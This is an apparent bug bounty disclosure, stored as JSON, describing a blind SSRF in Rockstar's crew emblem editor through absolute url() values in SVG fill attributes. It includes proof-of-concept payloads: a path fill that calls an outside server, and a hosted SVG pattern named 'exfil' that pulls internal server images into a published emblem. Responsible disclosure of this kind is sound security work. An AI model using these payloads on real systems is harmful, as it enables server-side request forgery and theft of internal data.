    "vulnerability_information": "Hello,\n\nAs per your recommendation in #233301, I'm submitting a PoC for another blind SSRF in the emblem editor.\n\nTo oversight here is allowing absolute `url()` values for the `fill` attribute:\n\n`<path fill=\"url(https://requestb.in/15rxmgv1#test)\" stroke=\"#a1a1a1\"  ... `\n\nUpon publishing an emblem containing such an element, a HTTP request to the given URL is sent from a Rockstar server. (`\u2588\u2588\u2588`). The destination port can be easily modified. This doesn't seem to work without including a fragment in the URL (`#test` in the example above).\n\nFurther testing showed that, if a valid SVG is found at the given URL, the `fill` data is actually used in the final image. Fortunately, \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 doesn't seem to support scripts, although the possibility of finding another way to exfiltrate data doesn't seem that out of reach.\n\nI've attached the full body of the emblem I've used to confirm this bug for ease of reproduction.",

            "markdown_message": "<p>Hello, I have an update to share on this one.</p>\n\n<p>I&#39;ve managed to find a way to retrieve data from Rockstar servers using this vulnerability, more precisely any image with a previously known path. I&#39;ve chosen the default Windows profile picture as a PoC, which resides in <code>\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588</code>.</p>\n\n<p>To display the image on your crew emblem, first, host a SVG that embeds an external image inside a pattern, like this:</p>\n<pre class=\"highlight plaintext\"><code>&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; version=&quot;1.1&quot;&gt;\n&lt;defs&gt;\n    &lt;pattern id=&quot;exfil&quot; width=&quot;512&quot; height=&quot;512&quot; patternUnits=&quot;userSpaceOnUse&quot;&gt;\n        &lt;image xlink:href=&quot;\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588&quot; x=&quot;0&quot; y=&quot;0&quot; height=&quot;256px&quot; width=&quot;256px&quot;/&gt;\n    &lt;/pattern&gt;\n&lt;/defs&gt;\n&lt;/svg&gt;\n</code></pre>\n<p>After uploading the SVG above somewhere on the internet, simply modify the original PoC to link to the pattern:</p>\n\n<p><code>&lt;path fill=&quot;url(https://yourserver.com/poc.svg#exfil)&quot; stroke=&quot;#a1a1a1&quot; ...</code></p>\n\n<p>This will result in the specified image from the Rockstar sever being shown in your crew emblem after publishing it, as you can see here:<br>\n<a title=\"https://prod.cloud.rockstargames.com/crews/sc/8130/32831039/publish/emblems/ca3f8d73b115d482c9a426c84614d371925673bf_512.png\" href=\"/redirect?signature=5af5da5c79679f00d3473a0010b653641961defc&amp;url=https%3A%2F%2Fprod.cloud.rockstargames.com%2Fcrews%2Fsc%2F8130%2F32831039%2Fpublish%2Femblems%2Fca3f8d73b115d482c9a426c84614d371925673bf_512.png\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://prod.cloud.rockstargames.com/crews/sc/8130/32831039/publish/emblems/ca3f8d73b115d482c9a426c84614d371925673bf_512.png</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>Fetching images from other internal hosts using this method should also be possible.

(<code>\u2588\u2588\u2588</code>). The destination port can be easily modified. This doesn&#39;t seem to work without including a fragment in the URL (<code>#test</code> in the example above).</p>\n\n<p>Further testing showed that, if a valid SVG is found at the given URL, the <code>fill</code> data is actually used in the final image. Fortunately, \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 doesn&#39;t seem to support scripts, although the possibility of finding another way to exfiltrate data doesn&#39;t seem that out of reach.</p>\n\n<p>I&#39;ve attached the full body of the emblem I&#39;ve used to confirm this bug for ease of reproduction.</p>\n",
